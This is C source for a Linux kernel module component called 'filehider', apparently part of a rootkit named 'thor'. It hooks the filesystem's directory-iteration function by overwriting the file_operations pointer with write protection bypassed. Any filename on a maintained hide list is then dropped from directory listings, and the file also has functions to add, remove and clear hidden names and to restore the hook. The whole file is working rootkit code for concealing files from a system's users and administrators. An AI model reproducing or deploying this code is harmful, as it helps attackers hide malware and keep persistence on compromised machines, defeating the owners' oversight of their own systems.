#include "filehider.h"

#include "helper.h"
#include "logging.h"

#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/version.h>

/* function prototypes */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_fs_iterate(struct file *file, void *dirent, filldir_t filldir);
#else
static int thor_fs_iterate(struct file *file, struct dir_context *ctx);
#endif
static int thor_fs_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

/* hiding list node */
struct _file_list {
    char *name;
    struct list_head list;
};

/* hiding list */
static struct _file_list file_list;

/* file operations on fs */
static struct file_operations *fs_fops;

/* pointer to original fs_iterate function */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int (*orig_fs_iterate)(struct file *file, void *dirent, filldir_t filldir);
#else
static int (*orig_fs_iterate)(struct file *, struct dir_context *);
#endif

/* pointer to original fs_filldir function */
static int (*orig_fs_filldir)(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

int filehider_init(void)
{
    struct file *filep_etc;
    void *iterate_addr;

    INIT_LIST_HEAD(&file_list.list);

    filep_etc = filp_open("/etc", O_RDONLY, 0);
    if (filep_etc == NULL) {
        LOG_ERROR("could not open /etc");
        return -1;
    }

    fs_fops = (struct file_operations*) filep_etc->f_op;
    filp_close(filep_etc, NULL);

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    orig_fs_iterate = fs_fops->readdir;
#else
    orig_fs_iterate = fs_fops->iterate;
#endif

    iterate_addr = (void*) &thor_fs_iterate;
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    write_no_prot(&fs_fops->readdir, &iterate_addr, sizeof(void*));
#else
    write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
#endif

    return 0;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_fs_iterate(struct file *file, void *dirent, filldir_t filldir)
{
    orig_fs_filldir = filldir;
    return orig_fs_iterate(file, dirent, thor_fs_filldir);
}
#else
static int thor_fs_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;

    /* capture original filldir function */
    orig_fs_filldir = ctx->actor;

    /* cast away const from ctx->actor */
    ctx_actor = (filldir_t*)(&ctx->actor);

    /* store our filldir in ctx->actor */
    *ctx_actor = thor_fs_filldir;
    ret = orig_fs_iterate(file, ctx);

    /* restore original filldir */
    *ctx_actor = orig_fs_filldir;

    return ret;
}
#endif

static int thor_fs_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type)
{
    struct _file_list *tmp;

    /* hide specified files */
    list_for_each_entry(tmp, &(file_list.list), list) {
        if (strcmp(name, tmp->name) == 0)
            return 0;
    }

    return orig_fs_filldir(buf, name, namelen, offset, ino, d_type);
}

void add_to_file_list(const char *name, unsigned int len)
{
    struct _file_list *tmp;

    tmp = (struct _file_list*) kmalloc(sizeof(struct _file_list), GFP_KERNEL);
    tmp->name = (char*) kmalloc(len, GFP_KERNEL);
    memcpy(tmp->name, name, len);
    tmp->name[len - 1] = 0;

    list_add(&(tmp->list), &(file_list.list));
}

void remove_from_file_list(const char *name, unsigned int len)
{
    struct _file_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(file_list.list)) {
        tmp = list_entry(pos, struct _file_list, list);
        if (strncmp(tmp->name, name, len - 1) == 0) {
            list_del(pos);
            kfree(tmp->name);
            kfree(tmp);
        }
    }
}

void clear_file_list(void)
{
    struct _file_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(file_list.list)) {
        tmp = list_entry(pos, struct _file_list, list);
        list_del(pos);
        kfree(tmp->name);
        kfree(tmp);
    }
}

void filehider_cleanup(void)
{
    if (fs_fops != NULL && orig_fs_iterate != NULL) {
        void *iterate_addr = orig_fs_iterate;
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
        write_no_prot(&fs_fops->readdir, &iterate_addr, sizeof(void*));
#else
        write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
#endif
    }

    clear_file_list();
}
